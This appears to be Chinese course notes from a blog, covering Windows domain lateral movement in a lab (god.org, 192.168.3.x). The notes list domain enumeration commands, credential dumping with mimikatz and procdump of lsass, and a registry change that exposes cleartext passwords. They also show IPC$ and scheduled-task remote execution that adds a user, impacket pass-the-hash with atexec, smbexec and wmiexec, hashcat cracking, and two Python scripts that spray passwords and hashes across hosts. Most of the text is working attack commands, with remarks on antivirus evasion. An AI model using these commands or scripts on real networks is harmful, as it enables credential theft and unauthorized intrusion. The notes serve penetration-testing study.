<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#子域 父域</span><br><span class="line">god.org		主域名</span><br><span class="line">sqlserver.god.org  	一台计算机的名字</span><br><span class="line">xiaodi.sqlserver.god.org</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 	用户信息收集操作演示</span></span><br><span class="line"><span class="comment">#	旨在了解当前计算机或域环境下用户及用户组信息 便于后期利用凭据进行测试</span></span><br><span class="line">系统默认常见用户身份</span><br><span class="line">Domain Admins		域管理员 默认对域控制器有完全控制权</span><br><span class="line">Domain Computers	域内机器</span><br><span class="line">Domain Controllers	域控制器</span><br><span class="line">Domain Guest		域访客 权限低</span><br><span class="line">Domain Users		域用户</span><br><span class="line">Enterprise Admins	企业系    统管理员用户 默认对域控制器有完全控制权</span><br><span class="line"><span class="comment">#	相关用户命令收集</span></span><br><span class="line"><span class="built_in">whoami</span> /all				用户权限</span><br><span class="line">net config workstation	登录信息</span><br><span class="line">net user				本地用户</span><br><span class="line">net localgroup			本地用户组</span><br><span class="line">net user /domain		获取域用户信息</span><br><span class="line">net group /domain		获取域用户组信息</span><br><span class="line">wmic useraccount get /all				涉及域用户详细信息</span><br><span class="line">net group <span class="string">&quot;Domain Admins&quot;</span> /domain		查询域管理员账户</span><br><span class="line">net group <span class="string">&quot;Enterprise Admins&quot;</span> /domain	查询管理net员用户组</span><br><span class="line">net group <span class="string">&quot;Domain Controllers&quot;</span> /domain	查询域控制器</span><br><span class="line"></span><br><span class="line">服务器的active directory可以看到域控管理的信息</span><br><span class="line"></span><br><span class="line"><span class="comment">#	凭据信息收集操作演示</span></span><br><span class="line"><span class="comment">#	旨在收集各种密文，明文，口令等，为后续横向渗透做测试准备</span></span><br><span class="line">计算机用户HASH明文 用mimikatz(win)	mimipenguin(linux)	需要权限</span><br><span class="line">	github下载 readme.md中有操作演示</span><br><span class="line">计算机各种协议服务口令获取 Lazagne(all)比较拉 XenArmor(win)收费</span><br><span class="line">    1.站点源码备份文件、数据库备份文件等</span><br><span class="line">    2.各类数据库Web管理入口，如phpmyadmin</span><br><span class="line">    3.浏览器保存密码 、浏览器Cookies</span><br><span class="line">    4.其他用户会话、3389和ipc$连接记录、回收站内容</span><br><span class="line">    5.Windows保存的WIFI密码</span><br><span class="line">    6.网络内部的各种账号和密码，如:Email、VPN、FTP、OA等</span><br><span class="line"></span><br><span class="line"><span class="comment">#	探针主机域架构服务操作演示</span></span><br><span class="line"><span class="comment">#	为后续横向思路做准备，针对应用，协议等各类攻击手法</span></span><br><span class="line">探针域控制器及地址信息</span><br><span class="line">net time /domain nslookup ping</span><br><span class="line"></span><br><span class="line">探针域内存活主机及地址信息</span><br><span class="line">nbtscan 192.168.3.0/24	第三方工具	(老牌 不免杀)</span><br><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr <span class="string">&quot;TTL=&quot;</span>		自带内部命令 (不用考虑免杀)</span><br><span class="line">nmap masscan 第三方PowerShell脚本nishang empire等	第三方可能被拦截</span><br><span class="line"></span><br><span class="line">nishang</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/image-20230514143859038.png" alt="image-20230514143859038"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	探针域内角色及服务信息</span></span><br><span class="line"><span class="comment">#	利用端口服务及计算机名判断</span></span><br><span class="line"><span class="comment">#	核心业务机器</span></span><br><span class="line"><span class="number">1.</span>高级管理人员、系统管理元、财务/人事/业务人员的个人计算机</span><br><span class="line"><span class="number">2.</span>产品管理系统服务器</span><br><span class="line"><span class="number">3.</span>办公系统服务器</span><br><span class="line"><span class="number">4.</span>财务应用系统服务器</span><br><span class="line"><span class="number">5.</span>核心产品源码服务器(自建SVN、GIT)</span><br><span class="line"><span class="number">6.</span>数据库服务器</span><br><span class="line"><span class="number">7.</span>文件或网盘服务器、共享服务器</span><br><span class="line"><span class="number">8.</span>电子邮件服务器</span><br><span class="line"><span class="number">9.</span>网络监控系统服务器</span><br><span class="line"><span class="number">10.</span>其他服务器(内部技术文档服务器、其他监控服务器等)</span><br></pre></td></tr></table></figure>

<h3 id="day66-内网安全-域横向批量at-amp-schtasks-amp-impacket"><a href="#day66-内网安全-域横向批量at-amp-schtasks-amp-impacket" class="headerlink" title="day66-内网安全-域横向批量at&amp;schtasks&amp;impacket"></a>day66-内网安全-域横向批量at&amp;schtasks&amp;impacket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">域环境</span><br><span class="line">	传递</span><br><span class="line">		at&amp;schtasks psexec&amp;smbexec wmic&amp;wmicexec PTH&amp;PTT&amp;PTK winrs&amp;winrm&amp;rdp</span><br><span class="line">	漏洞</span><br><span class="line">		cve-2014-6324 cve-2017-17010 cve-2020-1472</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	横向渗透明文传递at&amp;schtasks</span></span><br><span class="line">	已经拿下一台内网主机后 通过本地信息收集用户凭证信息后 at&amp;schtasks 远程主机执行命令</span><br><span class="line">    获得某域主机权限-&gt;minikatz得到密码(明文，<span class="built_in">hash</span>)-&gt;用到信息收集里面域用户列表当作用户名字典-&gt;得到密码明文当作密码字典-&gt;尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或者相关命令</span><br><span class="line">IPC</span><br><span class="line">	共享命名管道资源 实现进程间通信而开放的命名管道 通过提供可信任的用户名和口令，连接双方可以可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问</span><br><span class="line">    利用条件</span><br><span class="line">    	<span class="number">1.</span>获得用户名 密码</span><br><span class="line">        <span class="number">2.</span>开放<span class="number">139</span> <span class="number">445</span>端口 实现远程登录及对默认共享资源的访问 通过<span class="number">139</span>、<span class="number">445</span>端口可以实现对共享文件/打印机的访问</span><br><span class="line">        <span class="number">3.</span>管理员开启了默认共享</span><br><span class="line">利用流程</span><br><span class="line">	<span class="number">1.</span>简历IPC链接到目标主机</span><br><span class="line">    <span class="number">2.</span>拷贝要执行的命令脚本到目标主机</span><br><span class="line">    <span class="number">3.</span>查看时间 创建计划任务(at schtasks)定时拷贝到的脚本</span><br><span class="line">    <span class="number">4.</span>删除IPC链接</span><br><span class="line">net use \\server\ipc$<span class="string">&quot;password&quot;</span> /user:username <span class="comment"># 工作组</span></span><br><span class="line">net use \\server\ipc$<span class="string">&quot;password&quot;</span> /user:domain\username	<span class="comment">#域内</span></span><br><span class="line"><span class="built_in">dir</span> \\xx.xx.xx.xx\C$\	<span class="comment">#查看文件列表</span></span><br><span class="line">copy \\xx.xx.xx.xx\C$\<span class="number">1.</span>bat <span class="number">1.</span>bat	<span class="comment">#下载文件</span></span><br><span class="line">copy <span class="number">1.</span>bat \\xx.xx.xx.xx\C$	<span class="comment">#复制文件</span></span><br><span class="line">net use \\xx.xx.xx.xx\C$\<span class="number">1.</span>bat /<span class="keyword">del</span>	<span class="comment">#删除ipc</span></span><br><span class="line">net view xx.xx.xx.xx	<span class="comment">#查看对方共享</span></span><br><span class="line"></span><br><span class="line">建立ipc常见错误代码</span><br><span class="line">	<span class="number">5</span> 	错误访问 可能使用的不是管理员权限 需要提升权限</span><br><span class="line">    <span class="number">51</span>	网络问题 windows无法找到网络路径</span><br><span class="line">    <span class="number">53</span>	找不到网络路径 可能是IP地址错误 目标未开机 目标Lanmanserver服务未启动、有防火墙等问题</span><br><span class="line">    <span class="number">67</span>	找不到网络名 本地Lanmanworkstation服务未启动 目标删除ipc$</span><br><span class="line">    <span class="number">1219</span>提供的凭据和已存在凭据冲突 说明已建立IPC$ 需要先删除</span><br><span class="line">    <span class="number">1326</span>账号密码错误</span><br><span class="line">    <span class="number">1792</span>目标NetLogon服务未启动，连接域控常常出现此情况</span><br><span class="line">    <span class="number">2242</span>用户密码过期 目标有账号策略 强制定期更改密码</span><br><span class="line"></span><br><span class="line">建立ipc失败的原因</span><br><span class="line">	<span class="number">1</span>	目标系统不是NT或以上的操作系统</span><br><span class="line">    <span class="number">2</span>	对方没有打开IPC$共享</span><br><span class="line">    <span class="number">3</span>	对方未开启<span class="number">139</span>，<span class="number">445</span>端口 或者被防火墙屏蔽</span><br><span class="line">    <span class="number">4</span>	输出命令，账号密码有错误</span><br><span class="line"></span><br><span class="line">at&amp;schtasks</span><br><span class="line">at&lt;windows2012</span><br><span class="line">	net use \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span>\ipc$ <span class="string">&quot;Admin12345&quot;</span> /user:god.org\administrator	<span class="comment">#建立ipc连接</span></span><br><span class="line">	copy add.bat \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span>\c$ 	<span class="comment">#复制文件到其C盘</span></span><br><span class="line">    at \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="number">15</span>:<span class="number">47</span> C:\add.bat</span><br><span class="line"></span><br><span class="line">schtasks &gt;=windows2012</span><br><span class="line">	net use \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span>\ipc$ <span class="string">&quot;admin!@#45&quot;</span> /user:god:org\administrator</span><br><span class="line">    copy add.bat \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span>\c$</span><br><span class="line">    schtasks /create /s <span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> /ru <span class="string">&quot;SYSTEM&quot;</span> /tn adduser /sc DAILY /tr c:\add.bat /F		<span class="comment">#创建adduser对应的可执行文件</span></span><br><span class="line">    schtasks /run /s <span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> /tn /addduser /i		<span class="comment">#运行adduser任务</span></span><br><span class="line">    schtasks /delete /s <span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> /tn adduser /f		<span class="comment">#删除adduser任务</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	横向渗透明文HASH传递impacket		需要免杀 自带提权</span></span><br><span class="line">atexec.exe ./administrator:Admin12345@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">atexec.exe god/administrator:Admin12345@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">atexec.exe -hashes :..... ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	横向渗透明文HASH传递批量利用-综合</span></span><br><span class="line">FOR /F %%i <span class="keyword">in</span> (ips.txt) DO net use \\%%i\ipc$ <span class="string">&quot;admin!@#45&quot;</span> /user:administrator <span class="comment">#批量检测IP对应明文连接</span></span><br><span class="line">FOR /F %%i <span class="keyword">in</span> (ips.txt) DO atexec.exe ./administrator:admin!@<span class="comment">#45@%%i whoami	#批量检测IP对应明文回显版</span></span><br><span class="line">FOR /F %%i <span class="keyword">in</span> (<span class="keyword">pass</span>.txt) DO atexec.exe ./administrator:%%i@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> whoami <span class="comment">#批量检测明文对应ip回显版</span></span><br><span class="line">FOR /F %%i <span class="keyword">in</span> (<span class="built_in">hash</span>.txt) DO atexec.exe -hashes :%%i ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> whoami	<span class="comment">#批量就检测hash对应ip回显版</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	横向渗透明文HASH传递批量批量-升级版</span></span><br><span class="line">pip install pyinstaller</span><br><span class="line">pyinstaller -F fuck_neiwang_001.py		<span class="comment">#生成可执行EXE</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">   <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;192.168.3.31&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;192.168.3.33&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users=&#123;</span><br><span class="line">   <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;mack&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;vpnadm&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">passs=&#123;</span><br><span class="line">   <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;admin!@#45&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;Admin12345&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">   <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">       <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">           <span class="built_in">exec</span>=<span class="string">&quot;net use \&quot;+ &quot;</span>\<span class="string">&quot;+ip+&#x27;\ipc$ &#x27;+mima+&#x27; /user:god\&#x27;+user</span></span><br><span class="line"><span class="string">           print(&#x27;---&gt;&#x27;+exec+&#x27;&lt;---&#x27;)</span></span><br><span class="line"><span class="string">           os.system(exec)</span></span><br><span class="line"><span class="string">           time.sleep(1)</span></span><br></pre></td></tr></table></figure>

<h3 id="day67-内网安全-域横向smb-amp-wmi明文或hash传递"><a href="#day67-内网安全-域横向smb-amp-wmi明文或hash传递" class="headerlink" title="day67-内网安全-域横向smb&amp;wmi明文或hash传递"></a>day67-内网安全-域横向smb&amp;wmi明文或hash传递</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码</span><br><span class="line">windows2012以下版本如安装KB2871997补丁，无法获得明文密码</span><br><span class="line">针对以上 <span class="number">4</span>种解决方式</span><br><span class="line"><span class="number">1</span>	<span class="built_in">hash</span>传递(pth ptk)	进行移动</span><br><span class="line"><span class="number">2</span>	利用其他服务协议(SMB WMI)进行<span class="built_in">hash</span>移动</span><br><span class="line"><span class="number">3</span>	利用注册表操作开启wdigest Auth值进行获取</span><br><span class="line"><span class="number">4</span>	利用工具或第三方平台(Hashcat)进行破解获取</span><br><span class="line"></span><br><span class="line">windows系统LM Hash及NTLM Hsh加密算法，个人系统在windows vista后，服务器系统在windows <span class="number">2003</span>以后，认证方式均为NTLM Hash</span><br><span class="line"></span><br><span class="line">注册表修改wdigest 改为<span class="number">1</span></span><br><span class="line">	reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line"></span><br><span class="line">非官方自带</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	案例1-Procdump Mimikatz配合获取</span></span><br><span class="line">procdump是官方工具	如果上传mimikatz失败可以用procdump配合mimikatz获取</span><br><span class="line">	procdump -accepteula -ma lsass.exe lsass.dmp		<span class="comment">#lsass是取出来的密码</span></span><br><span class="line">    复制到mimikatz上执行</span><br><span class="line">    	privilege::debug</span><br><span class="line">    	sekurlsa::minidump lsass.dmp</span><br><span class="line">        sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat破解windows ntlm hash</span><br><span class="line">hashcat -a 0 -m 1000 file --force</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	案例2-域横向移动SMB服务利用-psexec，smbexec(官方自带)</span></span><br><span class="line">利用SMB服务可以通过明文或<span class="built_in">hash</span>传递来远程执行，条件<span class="number">445</span>端口服务开放</span><br><span class="line">	SMB		Server Message Block 网络协议</span><br><span class="line">    	被用于Web连接和客户端之间的信息沟通 最初目的是将DOS操作系统中本地文件接口<span class="string">&quot;中断13&quot;</span>改造为网络文件系统</span><br><span class="line"></span><br><span class="line">pstools上传至攻击主机</span><br><span class="line">psexec第一种 先有ipc链接，psexec需要明文或<span class="built_in">hash</span>传递</span><br><span class="line">	net use \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span>\ipc$ <span class="string">&quot;admin!@#45&quot;</span> /user:administrator</span><br><span class="line">    psexec \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> -s cmd	<span class="comment">#先有ipc链接 -s以system权限运行</span></span><br><span class="line">    </span><br><span class="line">psexec第二种 不用建立IPC直接提供明文账户密码</span><br><span class="line">	psexec \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> -u administrator -p Admin12345 -s cmd</span><br><span class="line">    <span class="comment">#官方Pstools无法采用hash连接	以下可能失败</span></span><br><span class="line">    	psexec -hashes :$HASH$ ./administrator@<span class="number">10.1</span><span class="number">.2</span><span class="number">.3</span></span><br><span class="line">    	psexec -hashes :$HASH$ domain/administrator@<span class="number">10.1</span><span class="number">.2</span><span class="number">.3</span></span><br><span class="line">    	psexec -hashes :..... ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span></span><br><span class="line"></span><br><span class="line">非官方自带-参考impacket工具包使用，操作简单，容易被杀</span><br><span class="line">smbexec无需先ipc连接 明文或<span class="built_in">hash</span>传递</span><br><span class="line">	smbexec god/administrator:Admin12345@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span></span><br><span class="line">    smbexec ./administrator:admin!@<span class="comment">#45@192.168.3.21</span></span><br><span class="line">	smbexec -hashes :$HASH$ ./admin@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span></span><br><span class="line">    smbexec -hashes :.... ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span></span><br><span class="line">    smbexec -hashes :.... god/administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	案例3-域横向移动WMI服务利用-cscript，wmiexec，wmic</span></span><br><span class="line">WMI(Windows Management Instrumentation)通过<span class="number">135</span>端口利用，支持用户名明文或者<span class="built_in">hash</span>的方式进行认证，并且该方法不会在目标日志系统留下痕迹</span><br><span class="line"></span><br><span class="line">自带WMIC 明文传递 无回显</span><br><span class="line"></span><br><span class="line">wmic /node:<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> /user:administrator /password:Admin12345 process call create <span class="string">&quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span></span><br><span class="line">            </span><br><span class="line">自带cscript明文传递 有回显</span><br><span class="line">cscript //nologo wmiexec.vbs /shell <span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> administrator Admin12345</span><br><span class="line"></span><br><span class="line">套件impacket wmiexec 明文或<span class="built_in">hash</span>传递 有回显exe版本</span><br><span class="line">wmiexec ./administrator:admin!@<span class="comment">#45@192.168.3.32 &quot;whoami&quot;</span></span><br><span class="line">wmiexec god/administrator:Admin12345@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec -hashes :.... ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec -hashes :.... god/administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	案例4-域横向移动以上服务hash批量利用-python编译exe</span></span><br><span class="line">pyinstaller.exe -F fuck_neiwang_002.py</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line"><span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">users=&#123;</span><br><span class="line"><span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;mack&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">hashs=&#123;</span><br><span class="line"><span class="string">&#x27;ccef208c6485269c20db2cad21734fe7&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line"><span class="keyword">for</span> mimahash <span class="keyword">in</span> hashs:</span><br><span class="line"><span class="comment">#wmiexec -hashes :hash god/user@ip whoami</span></span><br><span class="line"><span class="built_in">exec</span> = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; god/&quot;</span>+user+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + <span class="built_in">exec</span> + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">os.system(<span class="built_in">exec</span>)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#	涉及资源</span><br><span class="line">https://github.com/hashcat/hashcat</span><br><span class="line">https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools</span><br><span class="line">https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump</span><br><span class="line">https://github.com/Sysinternals/ProcDump-for-Linux</span><br><span class="line">https://github.com/maaaaz/impacket-examples-windows</span><br></pre></td></tr></table></figure>

